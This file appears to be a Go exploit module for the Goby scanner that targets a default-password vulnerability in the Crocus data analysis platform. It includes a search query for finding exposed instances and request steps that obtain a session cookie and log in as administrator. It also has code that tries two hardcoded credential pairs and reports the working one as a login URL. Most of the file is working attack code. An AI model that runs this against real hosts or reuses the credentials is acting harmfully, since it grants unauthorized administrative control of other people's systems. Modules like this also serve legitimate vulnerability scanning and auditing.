package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Crocus data analysis platform source/Plugin/RegisterLogin/Default.jsp file default password vulnerability",
    "Description": "<p>Crocus Data Analytics Platform is a comprehensive platform for data analytics and business intelligence. Developed by Crocus Technology, it aims to help enterprises and organizations extract valuable information and insights from massive data to support business decisions and optimize business processes. The platform provides a wealth of data analysis tools and functions, enabling users to perform operations such as data cleaning, data visualization, data mining, statistical analysis, and predictive modeling, so as to gain a deep understanding of the patterns and trends behind the data.</p><p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "Crocus",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "Crocus 数据分析平台 source/Plugin/RegisterLogin/Default.jsp 文件默认口令漏洞",
            "Product": "Crocus",
            "Description": "<p>Crocus数据分析平台是一个用于数据分析和业务智能的综合性平台。它由Crocus Technology开发，旨在帮助企业和组织从海量数据中提取有价值的信息和洞察力，以支持业务决策和优化业务流程。该平台提供了丰富的数据分析工具和功能，使用户能够进行数据清洗、数据可视化、数据挖掘、统计分析、预测建模等操作，从而深入了解数据背后的模式和趋势。</p><p>攻击者可通过默认口令&nbsp;admin/123456 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令&nbsp;admin/123456 控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Crocus data analysis platform source/Plugin/RegisterLogin/Default.jsp file default password vulnerability",
            "Product": "Crocus",
            "Description": "<p>Crocus Data Analytics Platform is a comprehensive platform for data analytics and business intelligence. Developed by Crocus Technology, it aims to help enterprises and organizations extract valuable information and insights from massive data to support business decisions and optimize business processes. The platform provides a wealth of data analysis tools and functions, enabling users to perform operations such as data cleaning, data visualization, data mining, statistical analysis, and predictive modeling, so as to gain a deep understanding of the patterns and trends behind the data.</p><p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "title=\"Crocus\" && body=\"ThirdResource\"",
    "GobyQuery": "title=\"Crocus\" && body=\"ThirdResource\"",
    "Author": "9429658@qq.com",
    "Homepage": "https://crocus.ai/",
    "DisclosureDate": "2021-12-02",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-42780"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Plugin/RegisterLogin/Default.jsp",
                "follow_redirect": true,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "ck|lastheader|regex|JSESSIONID=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/RegisterLogin.do?Action=Login",
                "follow_redirect": true,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID={{{ck}}};",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "UserName=admin&Password=123456&MailCode=&AuthCode="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"Result\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"Code\":200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:123456",
                "vulurl|define|variable|{{{scheme}}}://admin:123456@{{{hostinfo}}}/RegisterLogin.do?Action=Login"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Plugin/RegisterLogin/Default.jsp",
                "follow_redirect": true,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "ck|lastheader|regex|JSESSIONID=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/RegisterLogin.do?Action=Login",
                "follow_redirect": true,
                "header": {
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID={{{ck}}};",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "UserName=admin&Password=123456&MailCode=&AuthCode="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"Result\":true",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"Code\":200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|define|variable|admin:123456",
                "vulurl|define|variable|{{{scheme}}}://admin:123456@{{{hostinfo}}}/RegisterLogin.do?Action=Login"
            ]
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "5.5",
    "PocId": "10253"
}`

	sendPayloadwnhfewfh823buf2byfu32b := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulInfo := ``
		vulPath := ``
		requestConfig := httpclient.NewGetRequestConfig("/Plugin/RegisterLogin/Default.jsp")
		requestConfig.VerifyTls = false
		// requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.FollowRedirect = false
		// requestConfig.Data = "username=superman&passwd=Talent%40123&loginSubmitIpt="
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 {
				header := resp.HeaderString.String()
				jessionid := ""
				headerParts := strings.Split(header, "JSESSIONID=")
				if len(headerParts) > 1 {
					jessionidParts := strings.Split(headerParts[1], ";")
					if len(jessionidParts) > 0 {
						jessionid = jessionidParts[0]
						requestConfig := httpclient.NewPostRequestConfig("/RegisterLogin.do?Action=Login")
						requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						requestConfig.Header.Store("Cookie", "JSESSIONID="+jessionid+";")
						requestConfig.Data = "UserName=admin&Password=123456&MailCode=&AuthCode="
						if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
							if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"Result\":true") && strings.Contains(resp.RawBody, "\"Code\":200") {
								vulInfo = `admin:123456`
								return true, vulInfo, vulPath
							}
						}
						requestConfig.Data = "UserName=streamax20020818&Password=20020818streamax&MailCode=&AuthCode="
						if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
							if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"Result\":true") && strings.Contains(resp.RawBody, "\"Code\":200") {
								vulInfo = `streamax20020818:20020818streamax`
								return true, vulInfo, vulPath
							}
						}
					}
				}
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadwnhfewfh823buf2byfu32b(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadwnhfewfh823buf2byfu32b(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
